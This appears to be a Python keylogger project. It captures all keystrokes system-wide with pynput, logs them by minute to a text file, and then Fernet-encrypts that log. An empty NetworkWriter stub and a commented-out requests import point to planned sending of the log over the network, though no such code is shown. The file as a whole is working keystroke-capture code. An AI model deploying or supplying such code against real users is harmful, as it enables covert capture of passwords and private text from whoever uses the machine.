import time, os
from pynput import keyboard
from cryptography.fernet import Fernet
# from requests import request
# import json

class KeyLoggerService:
    def __init__(self):
        self.global_log = []
        self.log_l = {}
        self.long_str = ""

    @staticmethod
    def get_time():
        """Get The time by Minutes"""
        formatted_time = time.strftime("%Y-%m-%d %H:%M", time.localtime())
        return formatted_time

    def make_long_str(self, key):
        """Makes a long str to chek the last characters"""
        if hasattr(key, 'char') and key.char:
            self.long_str += key.char

    def make_dict(self, key):
        """Making The directory of the log"""
        now = self.get_time()
        if now in self.log_l:
            self.log_l[now].append(key)
        else:
            self.log_l[now] = [key]


class KeyLoggerManager:
    def __init__(self, service, writer):
        self.log_l = None
        self.Key = None
        self.global_log = None
        self.long_str = None
        self.service = service
        self.writer = writer

    def key_for_log(self, key):
        """Loging Every key to all the function needed"""
        self.service.make_long_str(key)
        self.service.make_dict(key)
        if self.service.long_str[-4:] == "exit":
            print("Detected 'exit' key:", list(self.service.long_str))
            self.service.long_str = ""
        elif key == keyboard.Key.space:
            self.writer.outing_to_file(self.service.log_l)
            self.service.global_log.append(self.service.log_l)
            self.service.log_l = {}
        elif key == keyboard.Key.esc:
            if self.service.log_l:
                self.service.global_log.append(self.service.log_l)
            for d in self.service.global_log:
                for minute in d:
                    print(f"{minute}\n{d[minute]} ")
            for d in self.service.global_log:
                self.writer.outing_to_file(d)
            self.service.log_l = {}
            return False
        return None

    def starting_listening(self):
        """Start listening"""
        self.service.log_l = {}
        self.service.long_str = ""
        with keyboard.Listener(on_release=self.key_for_log) as listener:
            listener.join()

class FileWriter:
    def outing_to_file(self, character):
        """Export to file"""
        with open("keyfile.txt", "a", encoding="utf-8") as f:
            for minute, items in character.items():
                f.write(minute + "\n")
                for t in items:
                    f.write(str(t) + "\n")

class Encryptor:
    def __init__(self, key_path):
        self.key_path = key_path
        self.key: bytes | None = None

    def make_key(self):
        """Load existing key or create a new one, store in self.key and return it."""
        if os.path.exists(self.key_path):
            self.key = open(self.key_path, "rb").read()
        else:
            self.key = Fernet.generate_key()
            with open(self.key_path, "wb") as f:
                f.write(self.key)
        print("Key:", self.key.decode())
        return self.key

    def encrypt_file(self, input_filename: str, output_filename: str, key: bytes) -> None:
        """Encrypt input -> write to output (never overwrite input in-place)."""
        f = Fernet(key)
        with open(input_filename, "rb") as fin:
            data = fin.read()
        enc = f.encrypt(data)
        with open(output_filename, "wb") as fout:
            fout.write(enc)

    def decrypt_file(self, input_filename: str, output_filename: str, key: bytes) -> None:
        """Decrypt input -> write to output."""
        f = Fernet(key)
        with open(input_filename, "rb") as fin:
            data = fin.read()
        dec = f.decrypt(data)
        with open(output_filename, "wb") as fout:
            fout.write(dec)

class NetworkWriter:
    pass

if __name__ == "__main__":
    # Logging
    service = KeyLoggerService()
    writer = FileWriter()
    manager = KeyLoggerManager(service, writer)
    manager.starting_listening()

    # Files
    original  = "keyfile.txt"
    encrypted = "keyfile.encrypted"
    decrypted = "keyfile_decrypted.txt"

    # Encrypt & Decrypt
    enc = Encryptor("key.key")
    key = enc.make_key()
    enc.encrypt_file(original, encrypted, key)
    enc.decrypt_file(encrypted, decrypted, key)
    print("Encryption & Decryption done.")
